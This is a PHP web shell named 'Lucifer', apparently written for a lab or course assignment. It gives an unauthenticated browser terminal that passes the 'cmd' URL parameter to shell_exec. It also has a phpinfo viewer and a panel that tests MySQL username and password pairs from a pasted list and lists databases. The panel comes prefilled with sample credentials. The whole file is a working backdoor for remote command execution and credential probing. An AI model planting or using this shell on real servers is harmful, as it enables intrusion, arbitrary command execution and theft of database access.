<?php

session_start();
$status = "";

if(isset($_GET['cmd'])) {
	
	if($_GET['cmd'] == "clstcmd"){
		$_SESSION['lstcmd'] = "" ;
	}elseif($_GET['cmd'] != ""){
		
		$output = shell_exec($_GET['cmd']);
		$c = "<pre>$output</pre>";
		$status = 'cmd';
		$_SESSION['lstcmd'] = $_SESSION['lstcmd'] . $c ;
	}
}else if(isset($_GET['lstcmd'])){
	echo $_SESSION['lstcmd'];
	$status = 'cmd';
	return;
}else if(isset($_GET['phpinfo'])){
	 phpinfo(); phpinfo(INFO_MODULES);
	 $status = 'phpinfo';
}else if(isset($_GET['trysqluser'])){
	$status = 'trysqluser';
	if(isset($_GET['trysqluserUser']) and 
	isset($_GET['trysqluserPassword']) and 
	isset($_GET['trysqluserDatabase'])){
		
		
		$servername = "localhost";
		$username = $_GET['trysqluserUser'];
		$password = $_GET['trysqluserPassword'];
		$dbname = $_GET['trysqluserDatabase'];

		// Create connection
		$conn = new mysqli($servername, $username, $password, $dbname);

		// Check connection
		if ($conn->connect_error) {
			//die("Connection failed: " . $conn->connect_error);
			echo "failed";
			return;
		}else{
			echo "success";
			return;
		}
	}
}else if(isset($_GET['loadsqluser'])){
	
	
	if(isset($_GET['loadsqluserUSER']) and 
	isset($_GET['loadsqluserPWD']) and 
	isset($_GET['loadsqluserDB'])){
	
	$sql="SHOW DATABASES";

	$link = mysqli_connect($_GET['loadsqluserDB'],$_GET['loadsqluserUSER'],$_GET['loadsqluserPWD']) or die ('Error connecting to mysql: ' . mysqli_error($link).'\r\n');

	if (!($result=mysqli_query($link,$sql))) {
			printf("Error: %s\n", mysqli_error($link));
		}

	while( $row = mysqli_fetch_row( $result ) ){
			if (($row[0]!="information_schema") && ($row[0]!="mysql")) {
				echo $row[0].",\r\n";
			}
		}
	return;
	}
}

?>


<html>
<head>
        <meta charset="UTF-8">
        <title>Lucifer</title>
	<style>
	canvas {
		-moz-user-select: none;
		-webkit-user-select: none;
		-ms-user-select: none;
	}
	body, html {
    padding: 0;
    margin: 0;
    background-color: #005274;
    height: 100%;
    width: 100%;
	color: white;
}

/* Style the tab */
.tab {
  overflow: hidden;
  border: 1px solid #ccc;
  background-color: #f1f1f1;
}

/* Style the buttons inside the tab */
.tab button {
  background-color: inherit;
  float: left;
  border: none;
  outline: none;
  cursor: pointer;
  padding: 14px 16px;
  transition: 0.3s;
  font-size: 17px;
}

/* Change background color of buttons on hover */
.tab button:hover {
  background-color: #ddd;
}

/* Create an active/current tablink class */
.tab button.active {
  background-color: #ccc;
}

/* Style the tab content */
.tabcontent {
  display: none;
  padding: 6px 12px;
  border: 1px solid #ccc;
  border-top: none;
  height: 90%;
}

div.topdiv {clear:both;top:0;height:90%;width:100%;background-color:#990000;color:#FFFFFF;font-size:16px;text-align:center;}
div.bottomdiv {clear:both;bottom:0;height:10%;width:100%;background-color:#009900;color:#FFFFFF;font-size:16px;text-align:center;}
#IPhpinfo, #ITerminal{width: 100%; height: 100%;}	
.BtnTerminal{height: 100%;}
.v {color: black !important; }

table {
  font-family: arial, sans-serif;
  border-collapse: collapse;
  width: 100%;
}

td, th {
  border: 1px solid #848484;
  text-align: left;
  padding: 8px;
}

tr:nth-child(even) {
  background-color: #848484;
}
	
	</style>
	</head>
<body onload="startLucifer()">

<script>
function httpGetAsync(theUrl, callback)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.onreadystatechange = function() { 
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
            callback(xmlHttp.responseText);
    }
    xmlHttp.open("GET", theUrl, true); // true for asynchronous 
    xmlHttp.send(null);
}

function loadTerminal(data){
	//console.log(data);
}

function sendTerminal(){
	var t = document.getElementById("TxtTerminalInput").value;
	 var xmlHttp = new XMLHttpRequest();
    xmlHttp.onreadystatechange = function() { 
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
		{console.log(xmlHttp.responseText);}
    }
    xmlHttp.open("GET", "index.php?cmd=" + t, true); // true for asynchronous 
    xmlHttp.send(null);
}

function refreshTerminal() {
    var ifr = document.getElementsByName('ITerminal')[0];
    ifr.src = ifr.src;
}

function checkDBSource(){
	document.getElementById("DynamicDBUser").innerHTML = "";
	var txtdbsource = document.getElementById("TxtDBUserSource").value;
	var splittedLines = txtdbsource.split('\n');
	//var html = document.getElementById("DynamicDBUser").innerHTML;
	for (var i = 0; i < splittedLines.length; i++) {
	  console.log("foundDBUSer: " + splittedLines[i]);
	  var u = splittedLines[i].includes(",");
	  if(u){
		  var dbu = splittedLines[i].split(",");
		  //"index.php?trysqluser=&trysqluserUser"+dbu[1]+"=&trysqluserPassword="+dbu[2]+"&trysqluserDatabase=" + dbu[0]
		  if(dbu.length == 3){
			  document.getElementById("DynamicDBUser").innerHTML = document.getElementById("DynamicDBUser").innerHTML + "<tr><td>"+dbu[0]+"</td><td>"+dbu[1]+"</td><td>"+dbu[2]+"</td><td><iframe src='index.php?trysqluser=&trysqluserUser="+dbu[1]+"&trysqluserPassword="+dbu[2]+"&trysqluserDatabase="+dbu[0]+"'></iframe></td><td><button onclick="+'"'+"loadDBUser('"+dbu[0]+"','"+dbu[1]+"','"+dbu[2]+"')"+'"'+">Load</button></td></tr>";
		  }
	  }
	  
	  
	}
}

function loadDBUser(db,usr,pwd){
	console.log("Loading: " + db +":"+usr+":"+pwd);
	var xmlHttp = new XMLHttpRequest();
    xmlHttp.onreadystatechange = function() { 
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
		{
			if(xmlHttp.responseText == "success"){
				console.log("loading db user view");
			}
		}
    }
    xmlHttp.open("GET", "index.php?trysqluser=&trysqluserUser="+usr+"&trysqluserPassword="+pwd+"&trysqluserDatabase="+db, true); // true for asynchronous 
    xmlHttp.send(null);
}

function loadDBFromUser(){
	var t = document.getElementById("TxtTerminalInput").value;
	var xmlHttp = new XMLHttpRequest();
    xmlHttp.onreadystatechange = function() { 
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
		{console.log(xmlHttp.responseText);}
    }
    xmlHttp.open("GET", "index.php?loadsqluser=", true); // true for asynchronous 
	xmlHttp.send(null);
}
</script>

<?php

if($status == ""){

?>

<div class="tab">
  <button class="tablinks" onclick="openMenuTabs(event, 'DatabaseUsers')">DatabaseUsers</button>
  <button class="tablinks" onclick="openMenuTabs(event, 'phpinfo')">phpinfo</button>
  <button class="tablinks" onclick="openMenuTabs(event, 'Terminal')">Terminal</button>
</div>

<div id="DatabaseUsers" class="tabcontent">
	<table id="TblDatabaseUsers">
	<tr><th>Database</th><th>Username</th><th>Password</th><th>Response</th><th></th></tr>
	<tbody id="DynamicDBUser">

	  </tbody>
	<tfoot>
	<tr><td><textarea id="TxtDBUserSource" placeholder="Source">
	assignment2,root,
	assignment2,shannon,Password8!
	</textarea></td><td><button onclick="checkDBSource()">Check Access</button></td><td></td><td></td><td></td></tr>
	</tfoot>
	</table>
</div>

<div id="phpinfo" class="tabcontent">
<div id="OverflowphpInfo"><iframe id="IPhpinfo" src="index.php?phpinfo=" title="Lucifer PhpInfo"></iframe></div>
</div>

<div id="Terminal" class="tabcontent">
<script>httpGetAsync("index.php",loadTerminal);</script>
  <div class="topdiv"><iframe id="ITerminal" name="ITerminal" src="index.php?lstcmd=" title="Lucifer Terminal"></iframe></div>
<div class="bottomdiv">
<table class="BtnTerminal">
<tr><td><textarea id="TxtTerminalInput" rows = "5" cols = "60" name = "description" placeholder="Terminal input"></textarea></td><td><button class="BtnTerminal" onclick="sendTerminal()" >Send</button></td><td><button class="BtnTerminal" onclick="refreshTerminal();">Refresh Terminal</button></td></tr>
</table>
</div>
</div>

<script>
function startLucifer() {
	console.log("Welcome to lucifer");
}

function openMenuTabs(evt, cityName) {
  var i, tabcontent, tablinks;
  tabcontent = document.getElementsByClassName("tabcontent");
  for (i = 0; i < tabcontent.length; i++) {
    tabcontent[i].style.display = "none";
  }
  tablinks = document.getElementsByClassName("tablinks");
  for (i = 0; i < tablinks.length; i++) {
    tablinks[i].className = tablinks[i].className.replace(" active", "");
  }
  document.getElementById(cityName).style.display = "block";
  evt.currentTarget.className += " active";
}
</script>

<?php }else{ ?>

<script>
	function startLucifer() {
		console.log("Auto Welcome to lucifer");
	}
</script>

<?php } ?>




</body>
</html>
